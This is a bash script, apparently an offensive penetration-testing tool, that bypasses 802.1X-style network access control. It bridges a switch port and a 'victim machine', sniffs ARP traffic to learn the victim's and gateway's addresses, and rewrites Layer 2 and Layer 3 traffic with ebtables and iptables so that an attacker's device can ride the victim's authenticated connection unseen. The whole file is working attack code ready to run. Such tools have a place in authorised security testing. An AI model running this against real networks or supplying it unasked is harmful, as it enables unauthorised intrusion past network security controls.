#!/bin/bash


BRINT=br0 # Bridge interface
BRIP=169.254.66.66 # Bridge IP address
BRGW=169.254.66.1 # Gateway IP address for the bridge
COMPIP='' # Victim machine IP address
GWIP='' # Gateway IP address
GWMAC='' # Gateway MAC address
COMPMAC='' # Victim machine MAC address
SWINT=eth1 # Network interface connected to the switch
COMPINT=eth2 # Network interface connected to the victim machine
EBFILE=/tmp/eblog.log # Ebtables log file
OPTION_ROUTE=0
OPTION_RESET=0

Usage() {
  echo "    -1 <eth>    Network interface connected to the switch"
  echo "    -2 <eth>    Network interface connected to the victim machine"
  echo "    -R          Add routes to gateway and victim machine"
  echo "    -h          Help"
  echo "    -r          Reset"
  exit 0
}

CheckParams() {
  while getopts ":1:2:Rhr" opts
    do
      case "$opts" in
        "1")
          SWINT=$OPTARG
          ;;
        "2")
          COMPINT=$OPTARG
          ;;
        "R")
          OPTION_ROUTE=1
          ;;
        "h")
          Usage
          ;;
        "r")
          OPTION_RESET=1
          ;;
      esac
  done
}

CheckUID() {
  if [ `id -u` -ne 0 ]; then
    echo -e "[ * ] Run this program as the root user"
    exit 0
  fi
}

Reset() {

  SWINT=`bridge link show $BRINT | awk 'NR==1 {print $2}' | cut -c -4`
  COMPINT=`bridge link show $BRINT | awk 'NR==2 {print $2}' | cut -c -4`

  ip link set dev $COMPINT down nomaster promisc off
  ip link set dev $SWINT down nomaster promisc off

  ip link set dev $BRINT down
  ip link del dev $BRINT

  ebtables -F
  ebtables -F -t nat
  arptables -F
  iptables -F
  iptables -F -t nat

  sysctl -w net.ipv6.conf.all.disable_ipv6=0 1>/dev/null
  sysctl -w net.ipv6.conf.default.disable_ipv6=0 1>/dev/null
  sysctl -w net.ipv6.conf.lo.disable_ipv6=0 1>/dev/null

  systemctl start NetworkManager.service
}

CheckUID
CheckParams $@

if [ "$OPTION_RESET" -eq 1 ]; then
  Reset
  exit 0
fi

echo -e "[ * ] Starting NAC bypass"
systemctl stop NetworkManager.service

sysctl -w net.ipv6.conf.all.disable_ipv6=1 1>/dev/null
sysctl -w net.ipv6.conf.default.disable_ipv6=1 1>/dev/null
sysctl -w net.ipv6.conf.lo.disable_ipv6=1 1>/dev/null
echo "" > /etc/resolv.conf

echo -e "[ * ] Starting bridge configuration"
ip link set $COMPINT down
ip link set $SWINT down
ip addr flush dev $COMPINT
ip addr flush dev $SWINT

ip link add name $BRINT type bridge
ip link set dev $COMPINT master $BRINT
ip link set dev $SWINT master $BRINT

ip link set $COMPINT up promisc on
ip link set $SWINT up promisc on

modprobe br_netfilter

echo 8 > /sys/class/net/br0/bridge/group_fwd_mask
echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

ip link set dev $BRINT up promisc on

ebtables -t nat -I PREROUTING 1 -i $COMPINT --log --log-level debug --log-ip --log-arp --log-prefix 'EBTEST-eth2-pre: '
echo $':msg, contains, "EBTEST-eth2-pre: " -'$EBFILE$'\n& ~' > /etc/rsyslog.d/10-ebtables.conf
systemctl restart rsyslog

echo -e "[ * ] Connect Ethernet cables to adatapers"
echo -e "[ * ] Trying to determine IP/MAC address of the gateway and the victim machine"

CN=0
while [ $CN -lt 1 ]
do
  CN=`cat $EBFILE 2>/dev/null | grep 'ARP MAC DST=00:00:00:00:00:00' | grep -v 'IP SRC=0.0.0.0' | wc -l`
done

RES=`cat $EBFILE | grep 'ARP MAC DST=00:00:00:00:00:00' | grep -m 1 -v 'IP SRC=0.0.0.0' | awk '{print $14,$31}'`

COMPMAC=`echo $RES | awk '{print $1}'`
COMPIP=`echo $RES | awk '{print $2}' | cut -c 5-`
NET=`echo $COMPIP | cut -d '.' -f -3`

while [ "$GWIP" = "" ]
do
  GWIP=`cat $EBFILE | grep 'MAC SRC='$COMPMAC' ARP IP SRC='$COMPIP | grep -m 1 -v 'DST='$COMPIP | awk '{print $37}' | cut -c 5-`
done
while [ "$GWMAC" = "" ]
do
  GWMAC=`cat $EBFILE | grep -v 'dest = 01:00:5e:' | grep -v 'dest = ff:ff:ff:ff:ff:ff' | grep 'source = '$COMPMAC | grep 'SRC='$COMPIP | grep -m 1 -v 'DST='$NET | awk '{print $18}'`
done

echo -e "[ * ] MAC/IP:"
echo -e "       GWMAC: $GWMAC"
echo -e "       GWIP: $GWIP"
echo -e "       COMPMAC: $COMPMAC"
echo -e "       COMPIP: $COMPIP"

rm $EBFILE
rm /etc/rsyslog.d/10-ebtables.conf
ebtables -t nat -D PREROUTING 1

echo -e "[ * ] Press any key to continue"
read -p " " -n1 -s

arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

BRMAC=`ip addr show dev $BRINT | grep -i ether | awk '{ print $2 }'`

ip addr add $BRIP dev $BRINT

echo -e "[ * ] Setting up Layer 2 rewrite"
ebtables -t nat -A POSTROUTING -s $BRMAC -o $COMPINT -j snat --to-src $GWMAC
ebtables -t nat -A POSTROUTING -s $BRMAC -o $SWINT -j snat --to-src $COMPMAC

echo -e "[ * ] Setting up Layer 3 rewrite"
arp -i $BRINT -s $GWIP $GWMAC
ip route del default
ip route add $BRGW dev $BRINT
ip route add default via $BRGW

iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -d $COMPIP -j SNAT --to $GWIP
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -j SNAT --to $COMPIP

arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP

if [ "$OPTION_ROUTE" -eq 1 ]; then
  echo -e "[ * ] Adding routes to the gateway and the victim machine"
  ip route add $GWIP via $BRIP 
  ip route add $COMPIP via $BRIP 
fi

echo -e "[ * ] Done"